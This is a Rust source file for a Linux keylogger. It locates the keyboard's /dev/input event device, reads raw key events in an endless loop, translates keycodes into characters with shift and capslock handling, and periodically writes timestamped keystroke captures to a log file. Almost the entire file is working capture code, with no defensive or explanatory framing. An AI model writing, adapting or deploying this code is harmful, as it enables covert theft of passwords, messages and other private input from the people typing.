use std::{fs::{File, OpenOptions, self}, io::{self, BufRead, Read, Cursor}, path::Path, collections::HashMap, time::SystemTime};
use byteorder::{NativeEndian, ReadBytesExt};
use anyhow::Result;

#[allow(dead_code)]
pub(crate) fn find_keyboard_device() -> Result<String> {
    //let input_dir = "/dev/input/event";
    let event_definition_file = "/proc/bus/input/devices";
    let event_dir = "/dev/input/";
    let mut keyboard_file = String::new();
    let mut tmp_value = String::new();
    //Open event definitions file
    let event_file_lines = File::open(event_definition_file)?;

    for line in io::BufReader::new(event_file_lines).lines() {
        let tmp_line = line.unwrap();
        // Set handler file
        if tmp_line.contains("H: Handlers=sysrq") {
            tmp_value = Path::new(&tmp_line).file_name().unwrap().to_string_lossy().to_string();
        }
        // If handler file supports keyboard events break.
        if tmp_line.contains("EV=120013") {
            let vec = tmp_value.split(" ");
            for elem in vec {
                if elem.contains("event") {
                    tmp_value = elem.to_string();
                    break;
                }
            }
            // Format keyboard file
            keyboard_file = format!("{}{}", event_dir,tmp_value);
            break;
        }
    }

    Ok(keyboard_file)
}

fn set_modifier(key_char: &str, shift: bool, capslock: bool, _ctrl: bool, _option: bool, _func: bool) -> Result<String> {
    // let special_chars = "1234567890[]/=\\;',.`";
    let shift_mapping: HashMap<&str, &str> = HashMap::from([
        ("1", "!"),
        ("2", "@"),
        ("3", "#"),
        ("4", "$"),
        ("5", "%"),
        ("6", "^"),
        ("7", "&"),
        ("8", "*"),
        ("9", "("),
        ("0", ")"),
        ("[", "{"),
        ("]", "}"),
        ("/", "?"),
        ("=", "+"),
        ("\\", "|"),
        ("'", "\""),
        (",", "<"),
        (".", ">"),
        ("`", "~"),
    ]);
    let mut res = key_char.clone().to_string();
    if shift && shift_mapping.contains_key(&key_char) {
        res = shift_mapping[&key_char].to_string();
    } else if shift || capslock {
        res = key_char.to_uppercase();
    }
    Ok(res)
}

fn log_keys_to_disk(captured_keys_buffer: String, log_file: String) -> Result<()> {
    let time_now: u64;
    match SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
        Ok(n) => time_now = n.as_secs(),
        Err(_) => panic!("SystemTime before UNIX EPOCH!"),
    }
    println!("{}", format!("{}: {}", time_now, captured_keys_buffer));
    
    fs::write(log_file, format!("{}: {}", time_now, captured_keys_buffer))?;
    Ok(())
}

#[allow(dead_code)]
pub(crate) fn log_keys(keyboard_device_path: String, log_file: String, write_interval: u64) -> Result<()> {
    let qwerty_map_no_mod: HashMap<u16, &str> = HashMap::from([
        (30 as u16, "a"),
        (31 as u16, "s"),
        (32 as u16, "d"),
        (33 as u16, "f"),
        (34 as u16, "g"),
        (35 as u16, "h"),
        (36 as u16, "j"),
        (37 as u16, "k"),
        (38 as u16, "l"),
        (39 as u16, ";"),
        (40 as u16, "'"),
        (28 as u16, "[retun]"),
        (14 as u16, "[delete]"),
        (42 as u16, "[shift]"),
        (42 as u16, "[Lshift]"),
        (44 as u16, "z"),
        (45 as u16, "x"),
        (46 as u16, "c"),
        (47 as u16, "v"),
        (48 as u16, "b"),
        (49 as u16, "n"),
        (50 as u16, "m"),
        (51 as u16, ","),
        (52 as u16, "."),
        (53 as u16, "/"),
        (54 as u16, "[Rshift]"),
        (29 as u16, "[Lctrl]"),
        (56 as u16, "[Loption]"),
        (41 as u16, "`"),
        (2 as u16, "1"),
        (3 as u16, "2"),
        (4 as u16, "3"),
        (5 as u16, "4"),
        (6 as u16, "5"),
        (7 as u16, "6"),
        (8 as u16, "7"),
        (9 as u16, "8"),
        (10 as u16, "9"),
        (11 as u16, "0"),
        (12 as u16, "-"),
        (13 as u16, "="),
        (15 as u16, "[tab]"),
        (16 as u16, "q"),
        (17 as u16, "w"),
        (18 as u16, "e"),
        (19 as u16, "r"),
        (20 as u16, "t"),
        (21 as u16, "y"),
        (22 as u16, "u"),
        (23 as u16, "i"),
        (24 as u16, "o"),
        (25 as u16, "p"),
        (26 as u16, "["),
        (27 as u16, "]"),
        (43 as u16, "\\"),
        (58 as u16, "[capslock]"),
        (57 as u16, "[space]"),
        (103 as u16, "[uparrow]"),
        (106 as u16, "[rightarrow]"),
        (105 as u16, "[leftarrow]"),
        (108 as u16, "[downarrow]"),
        (57 as u16, "[space]"),
        (125 as u16, "[Lfunction]"),
    ]);

    let mut shift: bool = false;
    let mut capslock: bool = false;
    let mut ctrl: bool = false;
    let mut option: bool = false;
    let mut func: bool = false;
    
    
    let mut file_options = OpenOptions::new();
    file_options.read(true);
    file_options.write(false);
    let mut dev_file = file_options.open(keyboard_device_path).unwrap();
    let mut packet = [0u8; 24];
    let mut capture_buffer: String = "".to_string();
    let mut now = SystemTime::now();

    loop {
        dev_file.read_exact(&mut packet).unwrap();
        let mut rdr = Cursor::new(packet);
        let tv_sec  = rdr.read_u64::<NativeEndian>().unwrap();
        let tv_usec = rdr.read_u64::<NativeEndian>().unwrap();
        let evtype  = rdr.read_u16::<NativeEndian>().unwrap();
        let code    = rdr.read_u16::<NativeEndian>().unwrap();
        let value   = rdr.read_i32::<NativeEndian>().unwrap();

        match now.elapsed() {
            Ok(elapsed) => {
                if elapsed.as_secs() >= write_interval {
                    if capture_buffer.len() > 0 {
                        log_keys_to_disk(capture_buffer.clone(), log_file.clone() )?;
                    }
                    capture_buffer = "".to_string();
                    now = SystemTime::now();
                }
            }
            Err(e) => { println!("Error: {:?}", e); }
        }
        // if evtype == 1 {
        //     println!("{} {} {} {} {}", _tv_sec, _tv_usec, evtype, code, value);
        //     println!("shift: {} capslock: {} ctl: {} option: {} function: {}", shift, capslock, ctrl, option, func);
        // }
        if code != 0 && (evtype == 1 && (value == 1 || value == 0)) {
            if qwerty_map_no_mod.contains_key(&code) {
                if value == 1 {
                    if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = true };
                    if qwerty_map_no_mod[&code] == "[capslock]" { capslock = !capslock };
                    if qwerty_map_no_mod[&code] == "[Lctrl]" || qwerty_map_no_mod[&code] == "[Rctrl]" { ctrl = true };
                    if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = true };
                    if qwerty_map_no_mod[&code] == "[Loption]" || qwerty_map_no_mod[&code] == "[Roption]" { option = true };
                    if qwerty_map_no_mod[&code] == "[Lfunction]" || qwerty_map_no_mod[&code] == "[Rfunction]" { func = true };

                    capture_buffer.push_str(set_modifier(qwerty_map_no_mod[&code], shift, capslock, ctrl, option, func ).unwrap().as_str());
                    
                }else if value == 0 {
                    if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = false };
                    if qwerty_map_no_mod[&code] == "[Lctrl]" || qwerty_map_no_mod[&code] == "[Rctrl]" { ctrl = false };
                    if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = false };
                    if qwerty_map_no_mod[&code] == "[Lshift]" || qwerty_map_no_mod[&code] == "[Rshift]" { shift = false };
                }
            } else if value == 1 || value == 0 {
                println!("{} {} {} {} {}", tv_sec, tv_usec, evtype, code, value);
            }
        }
    }
}


